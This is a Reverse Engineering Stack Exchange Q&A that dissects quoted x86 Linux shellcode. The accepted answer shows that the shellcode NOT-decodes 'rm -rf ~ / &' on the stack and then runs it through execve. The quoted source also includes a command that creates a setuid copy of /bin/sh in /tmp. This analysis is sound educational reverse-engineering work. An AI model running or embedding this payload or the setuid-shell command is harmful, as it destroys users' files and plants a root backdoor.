{
  "title": "How does this version of `rm -rf /` work?",
  "link": "https://reverseengineering.stackexchange.com/questions/8860/how-does-this-version-of-rm-rf-work",
  "content": "On this website, I found the following code:\n\n```\nchar esp[] __attribute__ ((section(”.text”))) /* e.s.p release */ = “\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68\\\"\n“\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99\\\"\n“\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7\\\"\n“\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56\"\n“\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31\"\n“\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69\"\n“\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00\"\n“cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;\n\n```\nI replaced the “ character with \", removed trailing \\ and put decoded it into a file. Here's what it disassembles to:\n\n```\n00000000  EB3E              jmp short 0x40\n00000002  5B                pop ebx\n00000003  31C0              xor eax,eax\n00000005  50                push eax\n00000006  54                push esp\n00000007  5A                pop edx\n00000008  83EC64            sub esp,byte +0x64\n0000000B  68FFFFFFFF        push dword 0xffffffff\n00000010  68DFD0DFD9        push dword 0xd9dfd0df\n00000015  688D99DF81        push dword 0x81df998d\n0000001A  688D92DFD2        push dword 0xd2df928d\n0000001F  54                push esp\n00000020  5E                pop esi\n00000021  F716              not dword [esi]\n00000023  F75604            not dword [esi+0x4]\n00000026  F75608            not dword [esi+0x8]\n00000029  F7560C            not dword [esi+0xc]\n0000002C  83C474            add esp,byte +0x74\n0000002F  56                push esi\n00000030  8D7308            lea esi,[ebx+0x8]\n00000033  56                push esi\n00000034  53                push ebx\n00000035  54                push esp\n00000036  59                pop ecx\n00000037  B00B              mov al,0xb\n00000039  CD80              int 0x80\n0000003B  31C0              xor eax,eax\n0000003D  40                inc eax\n0000003E  EBF9              jmp short 0x39\n00000040  E8BDFFFFFF        call dword 0x2\n00000045  2F                das\n00000046  62696E            bound ebp,[ecx+0x6e]\n00000049  2F                das\n0000004A  7368              jnc 0xb4\n0000004C  00                db 0x00\n0000004D  2D                db 0x2d\n0000004E  6300              arpl [eax],ax\n\n```\nAnd here's a hexdump:\n\n```\n[17:20:46][~]$ hexdump -C /tmp/b\n00000000  eb 3e 5b 31 c0 50 54 5a  83 ec 64 68 ff ff ff ff  |.>[1.PTZ..dh....|\n00000010  68 df d0 df d9 68 8d 99  df 81 68 8d 92 df d2 54  |h....h....h....T|\n00000020  5e f7 16 f7 56 04 f7 56  08 f7 56 0c 83 c4 74 56  |^...V..V..V...tV|\n00000030  8d 73 08 56 53 54 59 b0  0b cd 80 31 c0 40 eb f9  |.s.VSTY....1.@..|\n00000040  e8 bd ff ff ff 2f 62 69  6e 2f 73 68 00 2d 63 00  |...../bin/sh.-c.|\n00000050\n\n```\nWhat is it really? I can see /bin/sh and a call to execve so I guess it's some kind of shellcode, but I don't understand how it's run in this example (the char esp[] __attribute__ ((section(”.text”))) part).\n\n",
  "votes": "1",
  "answers": 1,
  "views": "2k",
  "tags": [
    "disassembly",
    "linux",
    "shellcode"
  ],
  "user": "d33tah",
  "time": "May 10, 2015 at 20:18",
  "comments": [],
  "answers_data": [
    {
      "content": "It's not run in the example. It's a shellcode, it has to be somehow injected (for example using a buffer overflow vulnerability).\nTo understand how it works, let's first put some addresses on the strings:\n\n```\n00000045  \"/bin/sh\"\n0000004D  \"-c\"\n0000004F  \"cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;\"\n\n```\nLet's look at the disassembly piece by piece.\n\n```\n00000000  EB3E              jmp short 0x40\n00000002  5B                pop ebx        ; 1st argument for execve(): filename = \"/bin/sh\"\n00000003  31C0              xor eax,eax    ; eax = 0\n00000005  50                push eax       ; envp[0] = NULL, argv[3] = NULL\n00000006  54                push esp\n00000007  5A                pop edx        ; 3rd argument for execve(): envp = {NULL}\n...\n00000040  E8BDFFFFFF        call dword 0x2\n00000045  \"/bin/sh\"\n...\n\n```\nThe jmp/call is a well known trick: the call will push the address of the following instruction to the stack. This gets popped into ebx, which now contains the address to \"/bin/sh\". In a system call, ebx is the first argument.\nNext, eax is zeroed using a xor instruction and pushed to the stack. The pointer to those four zero bytes is stored in esp, which ends up in edx (3rd argument). The envp parameter of execve() is terminated with a null pointer: no environment vars in this case. This will also be used in argv.\n\n```\n00000008  83EC64            sub esp,byte +0x64    ; Reserve 0x64 bytes on the stack\n0000000B  68FFFFFFFF        push dword 0xffffffff ; Push 4th string word\n00000010  68DFD0DFD9        push dword 0xd9dfd0df ; Push 3rd string word\n00000015  688D99DF81        push dword 0x81df998d ; Push 2nd string word\n0000001A  688D92DFD2        push dword 0xd2df928d ; Push 1st string word\n0000001F  54                push esp\n00000020  5E                pop esi             ; esi = esp\n00000021  F716              not dword [esi]     ; Not 1st string word: 0x2d206d72 'rm -'\n00000023  F75604            not dword [esi+0x4] ; Not 2nd string word: 0x7e206672 'rf ~'\n00000026  F75608            not dword [esi+0x8] ; Not 3rd string word: 0x26202f20 ' / &'\n00000029  F7560C            not dword [esi+0xc] ; Not 4th string word: 0x00000000 (NULL terminator)\n0000002C  83C474            add esp,byte +0x74  ; Restore esp\n\n```\n\"rm -rf ~ / &\" is pushed NOT-encoded into the stack and decoded in place. esi points to the decoded string.\n\n```\n0000002F  56                push esi            ; argv[2] = \"rm -rf ~ / &\"\n00000030  8D7308            lea esi,[ebx+0x8]   ; esi = address of \"-c\"\n00000033  56                push esi            ; argv[1] = \"-c\"\n00000034  53                push ebx            ; argv[0] = \"bin/sh\"\n00000035  54                push esp\n00000036  59                pop ecx    ; ecx = 2nd argument for execve(): argv = {\"/bin/sh\", \"-c\", \"rm -rf ~ / &\", NULL}\n00000037  B00B              mov al,0xb ; 11 = execve() system call\n00000039  CD80              int 0x80   ; execve()\n\n```\nIt's time to build the argv array and make the call. The previous piece of code restored esp, so whatever is pushed will be after that first 0x00000000. Piece by piece the arguments are pushed to the stack. Remember that ebx held the pointer to \"/bin/sh\" (7 chars + terminator), so ebx+8 will be \"-c\". The null word that was pushed into the stack at the very beginning of the shellcode is reused as the terminator for argv.\n\n```\n0000003B  31C0              xor eax,eax\n0000003D  40                inc eax        ; 1 = exit() system call\n0000003E  EBF9              jmp short 0x39 ; exit()\n\n```\nUsing xor+inc eax is set to 1, which is system call exit(). It then jumps to the int 0x80 instruction and exit() is called.\n\n",
      "votes": "9",
      "user": "Andrea Biondo",
      "time": "May 10, 2015 at 18:44",
      "is_accepted": true,
      "comments": [
        {
          "user": "d33tah",
          "text": "Ah, not-encoding! I never heard of it before and was expecting something more complicated. Thanks!",
          "time": null
        }
      ]
    }
  ]
}